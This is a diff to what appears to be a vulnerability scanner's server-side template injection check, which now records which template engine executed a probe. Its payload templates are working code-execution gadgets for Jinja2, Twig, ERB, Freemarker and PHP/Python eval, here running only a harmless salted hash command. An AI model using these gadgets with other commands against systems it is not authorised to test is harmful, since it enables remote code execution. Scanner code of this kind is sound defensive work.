@@ -1259,13 +1259,17 @@ def command_injection(ctx, probe) -> bool | None:
 # hashing app hashes the wrong bytes -> no LLM / reflection / echo FP. `{S}` is the salt placeholder (replaced,
 # not %-formatted, so the engine braces survive). BARE-ARITHMETIC template eval (no eval / RCE / hash reachable)
 # is deliberately NOT probed: a computed value is LLM-fakeable and therefore cannot be an execution oracle.
+# (engine, template): the gadget is engine-specific, so the payload that yields the digest also NAMES the
+# engine that executed it — an execution-PROVEN fingerprint, recorded as evidence (no extra round-trip, and
+# more granular than a bare {{7*'7'}} arithmetic probe). The hash still does the firing; the engine only labels.
 _SSTI_HASH_TMPL = (
-    "<?php echo hash('sha256','{S}');?>", "<?php echo md5('{S}');?>",                              # PHP eval
-    ";print(__import__('hashlib').sha256(b'{S}').hexdigest())#",                                   # Python eval
-    "{{cycler.__init__.__globals__.os.popen('printf {S}|sha256sum').read()}}",                     # Jinja2 (Python)
-    "{{['printf {S}|sha256sum']|map('system')|join('')}}",                                         # Twig (PHP)
-    "<%= `printf {S}|sha256sum` %>",                                                               # ERB (Ruby)
-    '<#assign x="freemarker.template.utility.Execute"?new()>${x("printf {S}|sha256sum")}',         # Freemarker (Java)
+    ("php-eval",    "<?php echo hash('sha256','{S}');?>"),                                          # PHP eval
+    ("php-eval",    "<?php echo md5('{S}');?>"),                                                    # PHP eval
+    ("python-eval", ";print(__import__('hashlib').sha256(b'{S}').hexdigest())#"),                   # Python eval
+    ("jinja2",      "{{cycler.__init__.__globals__.os.popen('printf {S}|sha256sum').read()}}"),     # Jinja2 (Python)
+    ("twig",        "{{['printf {S}|sha256sum']|map('system')|join('')}}"),                         # Twig (PHP)
+    ("erb",         "<%= `printf {S}|sha256sum` %>"),                                               # ERB (Ruby)
+    ("freemarker",  '<#assign x="freemarker.template.utility.Execute"?new()>${x("printf {S}|sha256sum")}'),  # Java
 )
 
 
@@ -1274,7 +1278,9 @@ def ssti_injectable(ctx, probe) -> bool | None:
     eval shape (PHP/Python eval, Jinja2/Twig/ERB/Freemarker RCE gadget); fires when the salt's exact digest
     reflects — a value only genuine server-side execution produces, which an LLM cannot fake (unlike the old
     arithmetic marker, which a capable model just computes). N/A when no input surface. Query params are tested
-    before forms (template/render sinks are usually GET params)."""
+    before forms (template/render sinks are usually GET params). On a fire, evidence records `engine` — the
+    gadget that produced the digest names the engine that executed it (jinja2/twig/erb/freemarker/php/python-eval),
+    an execution-proven fingerprint (the v2.0 LLM-echo foundation, item 4)."""
     q = [(e.raw_path, "get", list(e.query_params)) for e in ctx.profile.endpoints
          if e.method.lower() == "get" and e.query_params]
     forms = [(f.action, (f.method or "get").lower(), list(f.fields)) for f in ctx.profile.forms if f.fields]
@@ -1286,14 +1292,14 @@ def ssti_injectable(ctx, probe) -> bool | None:
         return None
     salt = "hlssti" + secrets.token_hex(6)
     wanted = (hashlib.sha256(salt.encode()).hexdigest(), hashlib.md5(salt.encode()).hexdigest())
-    payloads = [t.replace("{S}", salt) for t in _SSTI_HASH_TMPL]
+    payloads = [(engine, t.replace("{S}", salt)) for engine, t in _SSTI_HASH_TMPL]
     budget = probe.probe.get("max_attempts", 160)
     tested = False
     fields_seen = set()
     with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as c:
         for action, method, fields in targets:
             for field in fields:
-                for p in payloads:
+                for engine, p in payloads:
                     if budget <= 0:
                         break
                     budget -= 1
@@ -1302,7 +1308,8 @@ def ssti_injectable(ctx, probe) -> bool | None:
                     data = {fn: (p if fn == field else _XSS_FILLER) for fn in fields}
                     try:
                         if any(w in _xss_send(c, method, action, data).text for w in wanted):
-                            ctx.evidence.update(injectable=True, via="hash oracle", target=action, field=field)
+                            ctx.evidence.update(injectable=True, via="hash oracle", engine=engine,
+                                                target=action, field=field)
                             return True  # the engine hashed the salt to its exact digest -> real injection
                     except (httpx.HTTPError, httpx.InvalidURL):
                         continue
